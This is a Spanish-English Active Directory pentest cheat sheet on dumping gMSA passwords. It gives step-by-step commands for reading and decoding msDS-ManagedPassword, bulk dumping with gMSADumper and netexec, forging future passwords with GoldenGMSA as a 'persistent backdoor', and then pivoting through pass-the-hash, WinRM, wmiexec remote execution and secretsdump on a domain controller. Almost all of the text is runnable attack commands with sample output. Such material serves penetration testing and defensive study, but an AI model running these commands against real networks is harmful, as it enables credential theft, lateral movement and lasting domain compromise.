---
aliases:
  - gMSADumper
  - GoldenGMSA
  - msDS-ManagedPassword
  - gMSA Hash Dump
tags:
  - type/technique
  - vuln/ad-enumeration
  - technique/credential-access
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
type: SubCheatSheet
linked:
  - '[[AD - gMSA Enumeration]]'
---
# AD - gMSA Enumeration - gMSA Password Dump

***

## msDS-ManagedPassword Blob

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-ADServiceAccount <gmsa> -Properties msDS-ManagedPassword` | Blob binario (si autorizado) | Direct read. |
| `(Get-ADServiceAccount <gmsa> -Pr msDS-ManagedPassword).'msDS-ManagedPassword'` | Raw bytes | Para parser. |
| `ConvertFrom-ADManagedPasswordBlob $blob` (DSInternals) | Decode blob → cleartext + NT hash | Native parser. |
^ad-gmsadump-blob

**Blob structure (MS-GKDI):**
- `CurrentPassword` — cleartext bytes (UTF-16 LE).
- `PreviousPassword` — pwd anterior (rotation).
- `QueryPasswordInterval` — siguiente rotation.
- `UnchangedPasswordInterval` — min rotation.

DSInternals parsea + extrae NT hash + Kerberos keys (AES128/256).

```powershell
Install-Module DSInternals
Import-Module DSInternals

$blob = (Get-ADServiceAccount "SQL_gMSA" -Properties msDS-ManagedPassword).'msDS-ManagedPassword'
$decoded = ConvertFrom-ADManagedPasswordBlob $blob

$decoded | Select CurrentPassword,
                  @{n='NTHash';e={ConvertTo-NTHash -Password $_.SecureCurrentPassword}}
```

___

## gMSADumper (Python)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `python3 gMSADumper.py -u u -p pass -d corp.local` | Bulk dump cleartext + NT hash | Linux standard. |
| `python3 gMSADumper.py -u u -p pass -d corp.local -l <DC>` | Specific DC | Targeted. |
| `python3 gMSADumper.py -u u -p pass -d corp.local --hashes :NTHASH` | Auth con NT hash (PtH) | Sin password. |
| `python3 gMSADumper.py -u u -p pass -d corp.local -k -no-pass` | Kerberos auth (TGT) | OPSEC. |
^ad-gmsadump-tool

```bash
git clone https://github.com/micahvandeusen/gMSADumper
cd gMSADumper
pip install -r requirements.txt

python3 gMSADumper.py -u auditor -p 'Pass!' -d corp.local -l <DC>

# Output:
# Account: SQL_gMSA$
# NTLM: aabbccdd1122334455667788...
# Kerberos: aes256-cts-hmac-sha1-96 ...
# Kerberos: aes128-cts-hmac-sha1-96 ...
```

___

## netexec --gmsa

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `nxc ldap <DC> -u u -p p --gmsa` | Bulk dump (NT hash + Kerberos) | Quick. |
| `nxc ldap <DC> -u u -p p -H <NT-hash> --gmsa` | PtH auth | Sin password. |
| `nxc ldap <DC> -u u -p p -k --gmsa` | Kerberos auth | OPSEC. |
^ad-gmsadump-netexec

```bash
nxc ldap <DC> -u user -p pass --gmsa
# Output:
# [+] Account: SQL_gMSA$  NTLM: aabbccdd...
# [+] Account: WEB_gMSA$  NTLM: 11223344...
```

___

## GoldenGMSA Technique

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `GoldenGMSA.exe gmsainfo --sid <gmsa-SID>` | Read gMSA metadata (priv) | Pre-attack info. |
| `GoldenGMSA.exe kdsinfo` | Read KDS Root Keys (priv DA) | Required para forge. |
| `GoldenGMSA.exe compute --kdskey <key> --sid <gmsa-SID> --pwdid <managed-pwd-id>` | Compute pwd offline desde KDS Root Key | **Persistent backdoor** (calcula pwds futuros). |
^ad-gmsadump-goldengmsa

**Por qué crítico:** acceso al KDS Root Key + `msDS-ManagedPasswordId` permite computar **todas las gMSA passwords offline** (ahora y futuro). Persistent backdoor — solo invalidable rotando KDS Root Key (raro).

```bash
# Pre-requisitos
# 1. DA-level access (read KDS Root Keys)
# 2. Read msDS-ManagedPasswordId del gMSA target

GoldenGMSA.exe kdsinfo > kds_keys.json
GoldenGMSA.exe gmsainfo --sid S-1-5-21-...-1234 > gmsa_info.json

# Forge offline
GoldenGMSA.exe compute \
  --kdskey "<key-blob>" \
  --sid S-1-5-21-...-1234 \
  --pwdid "<managed-pwd-id-blob>"
```

___

## Native PowerShell Read

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `$blob = (Get-ADServiceAccount <gmsa> -Pr msDS-ManagedPassword).'msDS-ManagedPassword'` | Raw blob | Pre-decode. |
| `ConvertFrom-ADManagedPasswordBlob $blob` (DSInternals) | Decode | Standard parser. |
| `Test-ADServiceAccount <gmsa>` | Validar gMSA usable desde host actual | Permission test. |
^ad-gmsadump-pwsh

```powershell
# Pipeline native
Import-Module DSInternals

$gmsa = "SQL_gMSA"
$blob = (Get-ADServiceAccount $gmsa -Properties msDS-ManagedPassword -EA Stop).'msDS-ManagedPassword'
$decoded = ConvertFrom-ADManagedPasswordBlob $blob

# Cleartext password
$decoded.CurrentPassword | ConvertTo-NTHash
```

___

## NT Hash Extraction

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `ConvertTo-NTHash -Password $secureString` (DSInternals) | NT hash desde SecureString | Post-decode. |
| `python3 gMSADumper.py ...` | NT hash + Kerberos keys auto | Quick Linux. |
| `nxc ldap <DC> -u u -p p --gmsa` | Mismo | Standard. |
^ad-gmsadump-nthash

___

## Pivot Post-Dump

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `nxc smb <target> -u 'SQL_gMSA$' -H <NT-hash>` | PtH como gMSA | Lateral. |
| `nxc winrm <target> -u 'SQL_gMSA$' -H <NT-hash>` | WinRM lateral | Lateral. |
| `nxc mssql <target> -u 'SQL_gMSA$' -H <NT-hash>` | MSSQL Integrated Auth | DB lateral. |
| `getTGT.py corp.local/SQL_gMSA\$ -hashes :<NT> -dc-ip <DC>` | TGT como gMSA | Kerberos auth. |
| `wmiexec.py -hashes :<NT> 'corp.local/SQL_gMSA$@<target>'` | RCE lateral | Standard. |
^ad-gmsadump-pivot

```bash
# Pipeline lateral con gMSA hash
NT="aabbccdd1122..."
GMSA='SQL_gMSA$'

# Identify hosts donde gMSA tiene admin
nxc smb hosts.txt -u "$GMSA" -H "$NT"

# RCE
wmiexec.py -hashes :"$NT" "corp.local/$GMSA@<target>"

# Si gMSA tiene DA (jackpot)
secretsdump.py -hashes :"$NT" "corp.local/$GMSA@<DC>"
```

***
